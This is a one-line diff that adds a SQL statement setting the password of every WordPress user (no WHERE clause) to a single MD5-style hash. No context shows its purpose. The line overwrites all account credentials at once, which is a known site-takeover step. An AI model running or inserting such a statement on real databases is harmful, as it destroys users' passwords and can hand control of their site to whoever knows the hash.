@@ -1,0 +1,1 @@
+UPDATE wp_users SET user_pass = '8e85cf839c8fd20b8e95785fe8f3484b'
